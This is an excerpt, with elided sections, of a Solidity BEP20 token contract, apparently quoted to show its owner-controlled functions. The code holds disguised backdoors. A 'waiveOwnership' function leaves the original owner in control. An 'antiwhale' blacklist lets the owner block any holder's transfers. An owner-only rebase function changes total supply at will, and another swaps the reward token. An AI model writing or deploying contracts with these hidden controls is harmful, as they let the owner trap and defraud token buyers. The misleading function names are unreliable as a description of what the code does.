...
abstract contract OWNABLE {
    ...
    constructor(address _owner) {
       owner = _owner;owneradd = owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender) || owneradd == msg.sender, "!OWNER"); _;
    }

    function waiveOwnership() public onlyOwner {
        owneradd = address(0x000000000000000000000000000000000000dEaD);
    }
...
contract DividendDistributor is IDividendDistributor {
    ...
    function setRWRD(address coin) public onlyToken {
        RWRD = IBEP20(coin);
    }
...
contract TOKENS is IBEP20, OWNABLE {
    using SafeMath for uint256;
    ...
    bool public antiwhaleMode = true;
    bool public walletTransferAllowed = true;
    mapping (address => bool) public isAntiwhaleed;
    ...
    function rebase_percentage_master(uint256 _percentage_base1000, bool reduce) public onlyOwner returns (uint256 newSupply){
    ...
    function setRWRD(address coin) public onlyOwner {
        distributor.setRWRD(coin);
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!isFeeExempt[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != devFeeReceiver  && recipient != autoLiquidityReceiver){
        ...
        // Antiwhale
        if(antiwhaleMode){
            require(!isAntiwhaleed[sender] && !isAntiwhaleed[recipient],"Antiwhaleed");    
        }
    ...
    function enable_antiwhale(bool _status) public onlyOwner {
        antiwhaleMode = _status;
    }
    ...
    function manage_antiwhale(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201, "GAS Error: max allowed to antiwhale 200 addresses at a time"); // to prevent gas error
        for (uint256 i; i < addresses.length; ++i) {
            isAntiwhaleed[addresses[i]] = status;
        }
    }
